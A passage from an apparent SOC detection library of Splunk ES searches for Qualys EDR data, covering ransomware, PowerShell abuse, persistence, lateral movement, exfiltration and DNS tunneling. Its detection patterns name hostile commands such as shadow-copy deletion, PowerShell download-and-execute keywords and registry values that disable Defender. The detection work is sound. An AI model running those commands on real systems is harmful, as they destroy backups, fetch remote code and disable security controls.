        "(vssadmin.+delete.+shadows|bcdedit.+recoveryenabled.+no|wbadmin.+delete.+catalog|wmic.+shadowcopy.+delete)"),
    1, 0)

| eval is_file_encrypt=if(
    sourcetype="qualys:edr:file"
    AND action IN ("RENAME","CREATE")
    AND match(lower(file_name),
        "\.(encrypted|locked|crypt|enc|wncry|wncryt|ryuk|conti|sodinokibi|darkside|blackcat|alphv|akira)$"),
    1, 0)

| eval is_reg_tamper=if(
    sourcetype="qualys:edr:registry"
    AND action IN ("MODIFY","DELETE")
    AND match(lower(registry_path),
        "(\\windows defender\\disable|recoveryenabled|bootstatuspolicy|\\run\\)"),
    1, 0)

| eval hash_field=if(sourcetype="qualys:edr:process", process_hash_sha256, file_hash_sha256)

| bin _time span=10m

| stats
    sum(is_shadow_kill) as shadow_events
    sum(is_file_encrypt) as encrypt_events
    sum(is_reg_tamper) as tamper_events
    values(hash_field) as observed_hashes
    values(file_name) as encrypted_files
    values(command_line) as shell_commands
    min(_time) as firstTime
    max(_time) as lastTime
    by dest user _time

| where shadow_events >= 1 AND (encrypt_events >= 3 OR tamper_events >= 1)

| eval ransom_score = (shadow_events * 30) + (encrypt_events * 5) + (tamper_events * 20)

| mvexpand observed_hashes
| rename observed_hashes AS file_hash

| lookup local=true file_intel file_hash AS file_hash
    OUTPUT threat_key AS hash_threat description AS hash_desc

| stats
    max(ransom_score) as ransom_score
    max(shadow_events) as shadow_events
    max(encrypt_events) as encrypt_events
    max(tamper_events) as tamper_events
    values(encrypted_files) as sample_encrypted_files
    values(shell_commands) as commands
    values(hash_threat) as confirmed_threats
    min(firstTime) as firstTime max(lastTime) as lastTime
    by dest user

| eval intel_confirmed=if(isnotnull(mvindex(confirmed_threats,0)), "Hash in threat intel: " + mvjoin(confirmed_threats,", "), "Behavioral detection only")
| eval severity="critical"
| eval mitre_technique="T1486,T1490,T1562"
| convert timeformat="%Y-%m-%dT%H:%M:%S" ctime(firstTime) ctime(lastTime)
```

**Step-by-step creation:**

1. **Name:** `EXEC-002 - Ransomware Kill Chain Detected`
2. **Description:**
   `Multi-stage ransomware detection: requires shadow copy deletion AND (file encryption OR registry tampering) within 10 minutes on the same host. Ransom score calculated from event counts. Hash cross-referenced against file_intel for family identification. ISOLATE HOST IMMEDIATELY.`
3. **Schedule:** `*/5 * * * *` | Earliest `-11m` | Latest `-1m`
4. **Throttle:** Field = `dest` | Window = `300` seconds
5. **Notable Event:**
   - **Title:** `🔴 RANSOMWARE KILL CHAIN - $dest$ | Score: $ransom_score$ | $encrypt_events$ files encrypted | $intel_confirmed$`
   - **Severity:** `Critical`
   - **Security Domain:** `Endpoint`
6. Add **Adaptive Response Action → Run Script** if you have SOAR integration:
   - Script: Host isolation via Qualys EDR API
7. Save and Enable.

---

## EXEC-003 — Suspicious PowerShell Execution <a name="exec-003"></a>

**Why this is a top SOC priority:**
PowerShell is the most abused tool in modern attacks. Full tstats implementation
with Security Intelligence check on any IPs/URLs found in the command line.

```spl
| tstats summariesonly=true
    values(Processes.command_line) as command_lines
    values(Processes.parent_process) as parent_processes
    values(Processes.process_hash_sha256) as hashes
    min(_time) as firstTime
    max(_time) as lastTime
    count
    FROM datamodel=Endpoint.Processes
    WHERE Processes.process="*powershell*"
      AND (Processes.command_line="*-enc*"
        OR Processes.command_line="*-EncodedCommand*"
        OR Processes.command_line="*hidden*"
        OR Processes.command_line="*bypass*"
        OR Processes.command_line="*Invoke-Expression*"
        OR Processes.command_line="*IEX*"
        OR Processes.command_line="*DownloadString*"
        OR Processes.command_line="*WebClient*"
        OR Processes.command_line="*Net.WebClient*"
        OR Processes.command_line="*Invoke-WebRequest*"
        OR Processes.command_line="*Start-BitsTransfer*"
        OR Processes.command_line="*bitsadmin*")
    BY Processes.dest Processes.user Processes.process

| rename Processes.* AS *

| eval suspicious_indicators=mvappend(
    if(match(lower(command_lines),"-enc|-encodedcommand"), "Encoded command (obfuscation)", null()),
    if(match(lower(command_lines),"hidden"),               "Hidden window (stealth)", null()),
    if(match(lower(command_lines),"bypass"),               "Execution policy bypass", null()),
    if(match(lower(command_lines),"iex|invoke-expression"), "In-memory execution (IEX)", null()),
    if(match(lower(command_lines),"downloadstring|webclient|invoke-webrequest"), "Remote download", null()),
    if(match(lower(command_lines),"start-bitstransfer"),    "BITS transfer (LOLBin download)", null())
  )

| rex field=command_lines "(?i)(https?://[^\s\"\'\)\]]+)" max_match=3

| eval extracted_url=coalesce(match_1, match_2, match_3)

| lookup local=true url_intel url AS extracted_url
    OUTPUT threat_key AS url_threat description AS url_desc

| eval url_intel_result=if(isnotnull(url_threat),
    "⚠ URL in threat intel: " + url_threat + " - " + url_desc,
    if(isnotnull(extracted_url), "URL found (not in intel): " + extracted_url, "No URL extracted"))

| eval severity=case(
    isnotnull(url_threat),                                       "critical",
    match(lower(command_lines), "(iex|invoke-expression|downloadstring)"), "high",
    match(lower(command_lines), "(-enc|-encodedcommand|bypass)"), "high",
    1==1, "medium"
  )

| eval mitre_technique="T1059.001"
| convert timeformat="%Y-%m-%dT%H:%M:%S" ctime(firstTime) ctime(lastTime)
```

**Step-by-step creation:**

1. **Name:** `EXEC-003 - Suspicious PowerShell Execution`
2. **Description:**
   `Detects PowerShell with obfuscation, download, or in-memory execution indicators. Automatically escalates to Critical if extracted URLs match threat intel. Covers encoded commands, IEX/Invoke-Expression, WebClient downloads, and BITS transfers.`
3. **Schedule:** `*/15 * * * *` | Earliest `-20m` | Latest `-5m`
4. **Throttle:** Field = `dest,user` | Window = `600` seconds
5. **Notable Event:**
   - **Title:** `EXEC-003: Suspicious PowerShell on $dest$ by $user$ | $url_intel_result$`
   - **Severity:** `$severity$`
6. Save and Enable.

---

# GROUP 4 — PERSISTENCE & DEFENSE EVASION ALERTS

---

## PERS-001 — Registry Run Key Persistence <a name="pers-001"></a>

**Why this is a top SOC priority:**
Registry Run keys are the simplest persistence mechanism — malware adds itself here
to survive reboots. With Security Intelligence, we also check if the process that
WROTE the key has a malicious hash, giving us a combined behavioral + intel signal.

```spl
| tstats summariesonly=true
    values(Registry.registry_path) as registry_paths
    values(Registry.registry_value_name) as value_names
    values(Registry.registry_value_data) as value_data
    values(Registry.process_hash_sha256) as writing_proc_hashes
    values(Registry.process) as writing_processes
    min(_time) as firstTime
    max(_time) as lastTime
    count
    FROM datamodel=Endpoint.Registry
    WHERE Registry.action IN ("created","modified")
      AND (Registry.registry_path="*\\CurrentVersion\\Run\\*"
        OR Registry.registry_path="*\\CurrentVersion\\RunOnce\\*"
        OR Registry.registry_path="*\\Wow6432Node\\*\\Run\\*"
        OR Registry.registry_path="*\\policies\\Explorer\\Run\\*"
        OR Registry.registry_path="*\\Winlogon\\*")
    BY Registry.dest Registry.user

| rename Registry.* AS *

| where NOT match(lower(value_data),
    "(windows\\system32|program files|onedrive|teams|zoom|defender|qualys|splunk|microsoft\\edge)")

| mvexpand writing_proc_hashes
| rename writing_proc_hashes AS file_hash

| lookup local=true file_intel file_hash AS file_hash
    OUTPUT threat_key AS writer_threat description AS writer_desc

| stats
    values(registry_paths) as reg_paths
    values(value_names) as reg_value_names
    values(value_data) as reg_values
    values(writing_processes) as writers
    values(writer_threat) as intel_threats
    min(firstTime) as firstTime max(lastTime) as lastTime
    by dest user

| eval intel_result=if(isnotnull(mvindex(intel_threats,0)),
    "Writing process IS IN threat intel: " + mvjoin(intel_threats, ", "),
    "Writing process not in threat intel (behavioral detection)")

| eval severity=if(isnotnull(mvindex(intel_threats,0)), "critical", "high")
| eval mitre_technique="T1547.001"
| convert timeformat="%Y-%m-%dT%H:%M:%S" ctime(firstTime) ctime(lastTime)
```

**Step-by-step creation:**

1. **Name:** `PERS-001 - Persistence via Registry Run Key`
2. **Description:**
   `Detects creation or modification of Windows AutoRun registry keys excluding known-good software. Cross-references the hash of the process that wrote the key against file_intel — auto-escalates to Critical if the writing process is confirmed malware.`
3. **Schedule:** `*/15 * * * *` | Earliest `-20m` | Latest `-5m`
4. **Throttle:** Field = `dest,reg_value_names` | Window = `3600` seconds
5. **Notable Event:**
   - **Title:** `PERS-001: Run Key Persistence on $dest$ by $user$ | $intel_result$`
   - **Security Domain:** `Endpoint`
   - **Severity:** `$severity$`
   - **Description:** `Keys: $reg_paths$ | Values: $reg_values$ | Written by: $writers$`
6. Save and Enable.

---

## PERS-002 — Security Tool Disabled (Defender/UAC) <a name="pers-002"></a>

**Why this is a top SOC priority:**
Before deploying ransomware or exfiltration tools, sophisticated attackers disable
security controls. This is almost always malicious — there is virtually no legitimate
business reason for a non-admin process to turn off Windows Defender via the registry.

```spl
| tstats summariesonly=true
    values(Registry.registry_path) as registry_paths
    values(Registry.registry_value_name) as value_names
    values(Registry.registry_value_data) as value_data
    values(Registry.process) as modifying_processes
    values(Registry.process_hash_sha256) as proc_hashes
    min(_time) as firstTime
    max(_time) as lastTime
    count
    FROM datamodel=Endpoint.Registry
    WHERE Registry.action IN ("modified","deleted")
      AND (Registry.registry_path="*\\Windows Defender\\*"
        OR Registry.registry_path="*\\Policies\\System*"
        OR Registry.registry_path="*SharedAccess\\Parameters\\FirewallPolicy*"
        OR Registry.registry_path="*\\Winlogon\\*"
        OR Registry.registry_path="*\\CurrentControlSet\\Services\\WinDefend*")
      AND (Registry.registry_value_name="DisableRealtimeMonitoring"
        OR Registry.registry_value_name="DisableAntiSpyware"
        OR Registry.registry_value_name="DisableBehaviorMonitoring"
        OR Registry.registry_value_name="EnableLUA"
        OR Registry.registry_value_name="Start"
        OR Registry.registry_value_name="Userinit"
        OR Registry.registry_value_name="Shell")
    BY Registry.dest Registry.user

| rename Registry.* AS *

| where NOT match(lower(modifying_processes), "(trustedinstaller|msiexec|system)")

| mvexpand proc_hashes
| rename proc_hashes AS file_hash

| lookup local=true file_intel file_hash AS file_hash
    OUTPUT threat_key AS defender_killer_threat

| stats
    values(registry_paths) as paths
    values(value_names) as settings_changed
    values(value_data) as new_values
    values(modifying_processes) as processes
    values(defender_killer_threat) as confirmed_malware
    min(firstTime) as firstTime max(lastTime) as lastTime
    by dest user

| eval intel_flag=if(isnotnull(mvindex(confirmed_malware,0)),
    "CONFIRMED MALWARE disabling defenses", "Behavioral detection")
| eval severity="critical"
| eval mitre_technique="T1562.001"
| convert timeformat="%Y-%m-%dT%H:%M:%S" ctime(firstTime) ctime(lastTime)
```

**Step-by-step creation:**

1. **Name:** `PERS-002 - Security Tool Disabled via Registry`
2. **Description:**
   `Detects registry modifications that disable Windows Defender, UAC, or Windows Firewall. This is a critical pre-attack step. The hash of the disabling process is cross-referenced against file_intel. Excludes TrustedInstaller and legitimate system processes.`
3. **Schedule:** `*/5 * * * *` | Earliest `-6m` | Latest `-1m`
4. **Throttle:** Field = `dest` | Window = `300` seconds
5. **Notable Event:**
   - **Title:** `🔴 CRITICAL: Security Tool Disabled on $dest$ | Settings: $settings_changed$ | $intel_flag$`
   - **Severity:** `Critical`
6. Save and Enable.

---

## PERS-003 — Scheduled Task Created by Suspicious Process <a name="pers-003"></a>

**Why this is a top SOC priority:**
Scheduled tasks are a persistent mechanism second only to Run keys in attacker preference.
Creating a task that runs a PowerShell script, batch file, or executable from a temp
directory is extremely suspicious. With tstats + intel hash check this becomes high-confidence.

```spl
| tstats summariesonly=true
    values(Processes.command_line) as commands
    values(Processes.process_hash_sha256) as hashes
    values(Processes.parent_process) as parents
    min(_time) as firstTime
    max(_time) as lastTime
    count
    FROM datamodel=Endpoint.Processes
    WHERE (Processes.process="*schtasks*" OR Processes.process="*at.exe*")
      AND (Processes.command_line="*/create*"
        OR Processes.command_line="*New-ScheduledTask*"
        OR Processes.command_line="*Register-ScheduledTask*")
      AND (Processes.command_line="*powershell*"
        OR Processes.command_line="*cmd*"
        OR Processes.command_line="*\\temp\\*"
        OR Processes.command_line="*\\appdata\\*"
        OR Processes.command_line="*http*"
        OR Processes.command_line="*base64*"
        OR Processes.command_line="*-enc*")
    BY Processes.dest Processes.user Processes.process

| rename Processes.* AS *

| mvexpand hashes
| rename hashes AS file_hash

| lookup local=true file_intel file_hash AS file_hash
    OUTPUT threat_key AS task_threat description AS task_desc

| stats
    values(commands) as task_commands
    values(parents) as parent_processes
    values(task_threat) as intel_hits
    min(firstTime) as firstTime max(lastTime) as lastTime
    by dest user process

| eval intel_result=if(isnotnull(mvindex(intel_hits,0)),
    "CONFIRMED: Task creator is known malware", "Behavioral detection")
| eval severity=if(isnotnull(mvindex(intel_hits,0)), "critical", "high")
| eval mitre_technique="T1053.005"
| convert timeformat="%Y-%m-%dT%H:%M:%S" ctime(firstTime) ctime(lastTime)
```

**Step-by-step creation:**

1. **Name:** `PERS-003 - Suspicious Scheduled Task Creation`
2. **Description:**
   `Detects schtasks /create or Register-ScheduledTask when the task runs from temp paths, uses PowerShell, or references encoded/downloaded commands. Hash cross-referenced against file_intel for confirmation.`
3. **Schedule:** `*/15 * * * *` | Earliest `-20m` | Latest `-5m`
4. **Throttle:** Field = `dest,user` | Window = `3600` seconds
5. **Notable Event:**
   - **Title:** `PERS-003: Suspicious Scheduled Task on $dest$ by $user$ | $intel_result$`
   - **Severity:** `$severity$`
6. Save and Enable.

---

# GROUP 5 — LATERAL MOVEMENT & EXFILTRATION ALERTS

---

## LAT-001 — Lateral Movement to Multiple Internal Hosts <a name="lat-001"></a>

**Why this is a top SOC priority:**
After initial compromise, attackers fan out across the network. SMB, RDP, and WMI
are the three most common channels. Connecting to 3+ internal machines in a short
window is a very strong indicator. Security Intelligence check on source IPs catches
if a known-malicious external IP is driving the lateral movement.

```spl
| tstats summariesonly=true
    count as connection_count
    dc(Network_Traffic.dest_ip) as unique_targets
    values(Network_Traffic.dest_ip) as target_ips
    values(Network_Traffic.dest_port) as ports_used
    min(_time) as firstTime
    max(_time) as lastTime
    FROM datamodel=Network_Traffic
    WHERE (Network_Traffic.dest_port=445
        OR Network_Traffic.dest_port=139
        OR Network_Traffic.dest_port=3389
        OR Network_Traffic.dest_port=5985
        OR Network_Traffic.dest_port=5986
        OR Network_Traffic.dest_port=135)
      AND Network_Traffic.src_ip!="*"
    BY Network_Traffic.src_ip Network_Traffic.dest _time

| bin _time span=30m

| stats
    sum(connection_count) as total_connections
    max(unique_targets) as unique_targets
    values(target_ips) as targets
    values(ports_used) as ports
    min(firstTime) as firstTime
    max(lastTime) as lastTime
    by Network_Traffic.src_ip Network_Traffic.dest _time

| rename Network_Traffic.src_ip AS src_ip Network_Traffic.dest AS dest

| where unique_targets >= 3
  AND match(targets, "^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)")

| eval lateral_methods=mvappend(
    if(match(ports,"445|139"), "SMB (file share/pass-the-hash)", null()),
    if(match(ports,"3389"),    "RDP (remote desktop)", null()),
    if(match(ports,"5985|5986"), "WinRM (Windows remote management)", null()),
    if(match(ports,"135"),     "RPC/WMI", null())
  )

| lookup local=true ip_intel ip AS src_ip
    OUTPUT threat_key AS src_threat_key description AS src_threat_desc

| eval intel_flag=if(isnotnull(src_threat_key),
    "⚠ SOURCE IP IN THREAT INTEL: " + src_threat_key, "Source not in threat intel")

| eval severity=case(
    unique_targets >= 20 OR isnotnull(src_threat_key), "critical",
    unique_targets >= 10,                               "high",
    1==1, "medium"
  )

| eval mitre_technique="T1021"
| convert timeformat="%Y-%m-%dT%H:%M:%S" ctime(firstTime) ctime(lastTime)
```

**Step-by-step creation:**

1. **Name:** `LAT-001 - Lateral Movement to Multiple Internal Hosts`
2. **Description:**
   `Detects a host connecting to 3 or more internal machines via SMB/RDP/WinRM/RPC within 30 minutes. Automatically escalates to Critical if the source IP is in threat intel (indicating external attacker driving internal movement).`
3. **Schedule:** `*/15 * * * *` | Earliest `-35m` | Latest `-5m`
4. **Throttle:** Field = `dest` | Window = `1800` seconds
5. **Notable Event:**
   - **Title:** `LAT-001: Lateral Movement from $dest$ to $unique_targets$ hosts via $lateral_methods$ | $intel_flag$`
   - **Security Domain:** `Network`
   - **Severity:** `$severity$`
   - **Description:** `Targets: $targets$ | Ports: $ports$ | Connections: $total_connections$`
6. Save and Enable.

---

## EXFIL-001 — Large Outbound Data Transfer <a name="exfil-001"></a>

**Why this is a top SOC priority:**
Data theft requires moving data out. Large outbound transfers to external IPs, especially
if the destination IP is in threat intel, is a critical exfiltration indicator.
The Security Intelligence check on destination IPs is the key enhancement here.

```spl
| tstats summariesonly=true
    sum(Network_Traffic.bytes_out) as bytes_out
    sum(Network_Traffic.bytes_in) as bytes_in
    dc(Network_Traffic.dest_ip) as unique_external_dests
    values(Network_Traffic.dest_ip) as dest_ips
    values(Network_Traffic.dest_port) as dest_ports
    min(_time) as firstTime
    max(_time) as lastTime
    FROM datamodel=Network_Traffic
    WHERE Network_Traffic.bytes_out > 1000000
    BY Network_Traffic.dest Network_Traffic.src_ip _time

| bin _time span=1h

| stats
    sum(bytes_out) as total_bytes_out
    sum(bytes_in) as total_bytes_in
    max(unique_external_dests) as unique_dests
    values(dest_ips) as all_dest_ips
    values(dest_ports) as all_ports
    min(firstTime) as firstTime max(lastTime) as lastTime
    by Network_Traffic.dest Network_Traffic.src_ip

| rename Network_Traffic.dest AS dest Network_Traffic.src_ip AS src_ip

| where NOT match(all_dest_ips, "^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|127\.)")

| eval total_mb=round(total_bytes_out/1024/1024, 2)
| eval total_gb=round(total_mb/1024, 2)
| where total_mb >= 500

| mvexpand all_dest_ips
| rename all_dest_ips AS dest_ip

| lookup local=true ip_intel ip AS dest_ip
    OUTPUT threat_key AS exfil_threat description AS exfil_desc weight ip_rep

| stats
    max(total_mb) as total_mb
    max(total_gb) as total_gb
    max(unique_dests) as unique_dests
    values(dest_ip) as dest_ips
    values(exfil_threat) as intel_threats
    values(exfil_desc) as intel_descriptions
    max(ip_rep) as min_ip_rep
    min(firstTime) as firstTime max(lastTime) as lastTime
    by dest src_ip

| eval size_label=if(total_gb >= 1, tostring(total_gb) + " GB", tostring(total_mb) + " MB")

| eval intel_flag=if(isnotnull(mvindex(intel_threats,0)),
    "⚠ DESTINATION IN THREAT INTEL: " + mvjoin(intel_threats,", "),
    "Destination not in threat intel")

| eval severity=case(
    isnotnull(mvindex(intel_threats,0)) AND total_mb >= 100, "critical",
    isnotnull(mvindex(intel_threats,0)) OR total_mb >= 5000, "critical",
    total_mb >= 2000, "high",
    1==1, "medium"
  )

| eval mitre_technique="T1041"
| convert timeformat="%Y-%m-%dT%H:%M:%S" ctime(firstTime) ctime(lastTime)
```

**Step-by-step creation:**

1. **Name:** `EXFIL-001 - Large Outbound Data Transfer (Possible Exfiltration)`
2. **Description:**
   `Detects 500MB+ of outbound data to external IPs within 1 hour. Destination IPs cross-referenced against ip_intel — auto-escalates to Critical if data is being sent to a known-malicious destination. Tune the 500MB threshold based on your environment's normal backup/sync traffic.`
3. **Schedule:** `0 * * * *` (hourly) | Earliest `-65m` | Latest `-5m`
4. **Throttle:** Field = `dest` | Window = `3600` seconds
5. **Notable Event:**
   - **Title:** `EXFIL-001: Large Outbound Transfer from $dest$ - $size_label$ to $unique_dests$ external IPs | $intel_flag$`
   - **Security Domain:** `Network`
   - **Severity:** `$severity$`
6. Save and Enable.

---

## EXFIL-002 — DNS Tunneling Detection <a name="exfil-002"></a>

**Why this is a top SOC priority:**
DNS is often not filtered or inspected. Attackers encode data in DNS queries to exfiltrate
information or receive C2 commands even on networks with strict outbound filtering.
High-volume queries to long/randomized subdomains is the primary indicator.
Domain intel check catches known tunneling infrastructure.

```spl
index=edr sourcetype="qualys:edr:network"
  dns_query=*

| eval domain=lower(dns_query)

| rex field=domain "^(?P<subdomain>[^\.]+)\."

| eval sub_length=len(subdomain)
| eval entropy_indicator=if(
    match(subdomain, "^[a-z0-9]{20,}$") AND
    NOT match(subdomain, "^(www|mail|smtp|ftp|api|dev|test|staging|prod|cdn|static)$"),
    1, 0)

| where sub_length >= 20 OR entropy_indicator=1

| lookup local=true domain_intel domain AS domain
    OUTPUT threat_key AS domain_threat description AS domain_desc dns_threat_category

| stats
    count as query_count
    dc(domain) as unique_domains
    values(domain) as sample_domains
    values(domain_threat) as intel_threats
    min(_time) as firstTime
    max(_time) as lastTime
    by dest

| where query_count >= 10

| eval intel_flag=if(isnotnull(mvindex(intel_threats,0)),
    "Domain in threat intel: " + mvjoin(intel_threats,", "),
    "Not in intel - behavioral detection")

| eval severity=case(
    isnotnull(mvindex(intel_threats,0)), "critical",
    query_count >= 100,                  "high",
    1==1, "medium"
  )

| eval mitre_technique="T1071.004"
| convert timeformat="%Y-%m-%dT%H:%M:%S" ctime(firstTime) ctime(lastTime)
```

**Step-by-step creation:**

1. **Name:** `EXFIL-002 - DNS Tunneling Detection`
2. **Description:**
   `Detects DNS queries with subdomains 20+ characters long or matching high-entropy patterns, consistent with DNS tunneling for data exfiltration or C2. Domains cross-referenced against domain_intel. Requires dns_query field in qualys:edr:network events.`
3. **Schedule:** `0 * * * *` | Earliest `-65m` | Latest `-5m`
4. **Throttle:** Field = `dest` | Window = `3600` seconds
5. **Notable Event:**
   - **Title:** `EXFIL-002: DNS Tunneling from $dest$ - $query_count$ suspicious queries | $intel_flag$`
   - **Security Domain:** `Network`
   - **Severity:** `$severity$`
6. Save and Enable.

---

# SECTION C — OPERATIONS

---

## 23. Risk Score Summary Alert (RBA Aggregator) <a name="rba"></a>

This is a meta-alert that fires when a single entity (host or user) accumulates
too much risk across multiple lower-severity alerts. It turns many medium alerts
into one critical incident when they stack up on the same target.

**How it works:** Each correlation search adds a risk score to the `risk` index.
This search reads accumulated scores and fires when a threshold is crossed.

**First, add Risk Analysis to your existing searches:**
In the Adaptive Response Actions tab, add **Risk Analysis** to every search:
- `TI-001`: dest score 80, user score 50
- `TI-002`: dest score 60, user score 30
- `EXEC-001`: dest score 80, user score 60
- `EXEC-002`: dest score 100, user score 80
- `EXEC-003`: dest score 40, user score 30
- `AUTH-001`: dest score 50, user score 20
- `PERS-001`: dest score 50, user score 40
- `LAT-001`: dest score 70, user score 50

**Then create the aggregator search:**

```spl
index=risk sourcetype=stash

| stats
    sum(risk_score) as total_risk
    count as alert_count
    dc(source) as unique_rules_triggered
    values(source) as rules_fired
    values(risk_object_type) as object_types
    values(annotations.mitre_attack.mitre_technique_id) as mitre_techniques
    min(_time) as firstTime
    max(_time) as lastTime
    by risk_object

| where total_risk >= 150

| eval severity=case(
    total_risk >= 400, "critical",
    total_risk >= 250, "high",
    1==1, "medium"
  )

| eval risk_summary="Total Risk: " + tostring(total_risk)
    + " | Alerts Fired: " + tostring(alert_count)
    + " | Unique Rules: " + tostring(unique_rules_triggered)

| lookup local=true ip_intel ip AS risk_object
    OUTPUT threat_key AS entity_intel

| eval entity_in_intel=if(isnotnull(entity_intel),
    "Entity is in threat intel: " + entity_intel,
    "Entity not in threat intel")

| convert timeformat="%Y-%m-%dT%H:%M:%S" ctime(firstTime) ctime(lastTime)
```

**Step-by-step creation:**

1. **Name:** `RBA-AGGREGATOR - High Risk Entity Detected`
2. **Description:**
   `Fires when a single host or user accumulates 150+ risk points from multiple correlation searches within the risk window. This is the primary escalation path: many medium alerts on the same entity become a high-priority incident. Think of this as the 'connecting the dots' alert.`
3. **Schedule:** `0 */1 * * *` (every hour) | Earliest `-25h@h` | Latest `-1h@h`
4. **Throttle:** Field = `risk_object` | Window = `86400` seconds
5. **Notable Event:**
   - **Title:** `🔴 HIGH RISK ENTITY: $risk_object$ | $risk_summary$ | $entity_in_intel$`
   - **Security Domain:** `Endpoint`
   - **Severity:** `$severity$`
   - **Description:** `Rules that fired: $rules_fired$ | MITRE Techniques: $mitre_techniques$`
6. Save and Enable.

---

## 24. Alert Priority Matrix & Scheduling Reference <a name="matrix"></a>

### Complete Alert Inventory

| ID | Alert Name | Category | Schedule | Severity | Intel Used | MITRE |
|---|---|---|---|---|---|---|
| TI-001 | Malicious File Hash Executed | Threat Intel | `*/5 * * * *` | Critical | file_intel | T1204 |
| TI-002 | Communication to Malicious IP | Threat Intel | `*/5 * * * *` | Variable | ip_intel | T1071 |
| TI-003 | DNS Query to Malicious Domain | Threat Intel | `*/5 * * * *` | Variable | domain_intel | T1071.004 |
| TI-004 | Malicious URL in Command Line | Threat Intel | `*/15 * * * *` | Critical | url_intel | T1105 |
| TI-005 | Process + C2 Connection Chain | Threat Intel | `*/15 * * * *` | Variable | ip_intel | T1059,T1071 |
| AUTH-001 | Brute Force / Password Spray | Identity | `*/15 * * * *` | Variable | ip_intel | T1110 |
| AUTH-002 | New Local Admin Account | Identity | `*/15 * * * *` | High | — | T1136.001 |
| EXEC-001 | Credential Dumping Tools | Execution | `*/5 * * * *` | Critical | file_intel | T1003 |
| EXEC-002 | Ransomware Kill Chain | Execution | `*/5 * * * *` | Critical | file_intel | T1486,T1490 |
| EXEC-003 | Suspicious PowerShell | Execution | `*/15 * * * *` | Variable | url_intel | T1059.001 |
| EXEC-004 | LOLBin Abuse | Execution | `*/15 * * * *` | High | file_intel | T1218 |
| PERS-001 | Registry Run Key | Persistence | `*/15 * * * *` | Variable | file_intel | T1547.001 |
| PERS-002 | Security Tool Disabled | Defense Evasion | `*/5 * * * *` | Critical | file_intel | T1562.001 |
| PERS-003 | Suspicious Scheduled Task | Persistence | `*/15 * * * *` | Variable | file_intel | T1053.005 |
| LAT-001 | Lateral Movement | Lateral Movement | `*/15 * * * *` | Variable | ip_intel | T1021 |
| EXFIL-001 | Large Outbound Transfer | Exfiltration | `0 * * * *` | Variable | ip_intel | T1041 |
| EXFIL-002 | DNS Tunneling | Exfiltration | `0 * * * *` | Variable | domain_intel | T1071.004 |
| RBA | Risk Aggregator | Meta-Alert | `0 */1 * * *` | Variable | ip_intel | Multiple |

### SOC Triage Priority Order

When multiple alerts fire at the same time, work them in this order:

```
PRIORITY 1 (Respond within 15 minutes):
  TI-001 Malicious Hash | EXEC-002 Ransomware | PERS-002 Security Disabled

PRIORITY 2 (Respond within 1 hour):
  TI-002 Malicious IP | TI-003 Malicious Domain | EXEC-001 Cred Dump | RBA Aggregator

PRIORITY 3 (Respond within 4 hours):
  TI-004 Malicious URL | TI-005 Process+C2 | AUTH-001 Brute Force | LAT-001 Lateral Movement

PRIORITY 4 (Respond same business day):
  AUTH-002 New Admin | EXEC-003 PowerShell | PERS-001 Run Key |
  PERS-003 Sched Task | EXFIL-001 Transfer | EXFIL-002 DNS Tunnel
```

---

## 25. Common Tuning Patterns <a name="tuning"></a>

### Pattern 1 — Allowlisting Specific Hosts from an Alert

Add directly to your search before the final stats:
```spl
| lookup excluded_hosts_<alert_id>.csv dest OUTPUT is_excluded
| where isnull(is_excluded)
```

### Pattern 2 — Adjusting Intel Confidence Threshold

If `file_intel` is returning low-confidence matches causing false positives:
```spl
| where isnotnull(threat_key) AND weight >= 70
```
This requires the intel match to have at least 70% confidence.

### Pattern 3 — Tuning IP Reputation Threshold

If ip_intel `ip_rep` is too sensitive, raise the threshold:
```spl
| where ip_rep <= -60
```
Change from the default -50 to -60 to require stronger negative reputation.

### Pattern 4 — Verify Intel Freshness

Run this weekly to ensure your feeds are still being updated:
```spl
| inputlookup ip_intel
| stats max(_time) as last_update count by source
| convert timeformat="%Y-%m-%dT%H:%M:%S" ctime(last_update)
| sort -last_update
```

If `last_update` is more than 48 hours old for a feed, check the Threat
Intelligence Manager configuration — the feed may be failing to poll.

### Pattern 5 — Quick False Positive Check Before Suppressing

Before creating a suppression, always verify the scope:
```spl
index=notable source="CS-NAME-HERE"
| stats count by dest user
| sort -count
```

If 90% of notable events come from the same 2 hosts, those hosts need
allowlisting — not a global threshold change.

---

*SOC Alert Library v3.0 — Splunk ES + Qualys EDR + Security Intelligence*
*Accelerated Endpoint & Network_Traffic Data Models | tstats throughout | Intel lookups on all Tier 1 alerts*
